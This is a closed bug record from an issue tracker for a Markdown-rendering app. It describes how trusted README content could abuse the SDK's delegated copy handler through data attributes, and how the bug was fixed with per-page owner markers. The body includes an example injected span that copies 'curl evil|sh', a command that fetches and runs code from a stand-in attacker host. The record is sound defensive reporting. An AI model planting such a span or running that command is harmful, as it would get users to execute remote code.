---
type: is
id: is-01m39qqyxg1d5r43e5a7kcsq8e
title: Trusted Markdown can trigger app gadgets through data attributes (data-mb-copy clipboard)
kind: bug
status: closed
priority: 3
version: 3
delegate: claude-code@spud10.local
labels:
  - release:v0.12.0
dependencies: []
hold: null
hold_until: null
created_at: 2026-09-24T12:55:13.070Z
updated_at: 2026-09-24T19:14:20.370Z
started_at: 2026-09-24T18:04:56.151Z
closed_at: 2026-09-24T19:14:20.368Z
close_reason: "Fixed in PR #237 (987d4e67, 07c236c5, 8bfa73ec): delegated handlers (copy, Load more, crumbs, parent folder, print) act only on controls stamped with a per-page random data-mb-owner value. Breaking: PLUGIN_SDK_VERSION is now 0.7, with all built-in manifests and design-system docs updated. SECURITY.md records the trusted-mode stylesheet leak residual."
resolution: null
duplicate_of: null
---
From the step 8 verification (2026-09-24): in a trusted folder, KPress keeps data-* attributes, so a README <span data-mb-copy="text" data-mb-copy-text="curl evil|sh"> is handled by the SDK's document-wide copy delegate and copies attacker text on click. Untrusted renders strip data-* (inert allowlist), so this affects trusted content only. Scope the SDK's delegated handlers (copy, and any others) to elements the app or a plugin created, e.g. by requiring an app-owned marker or registering targets, and add tests with injected elements.
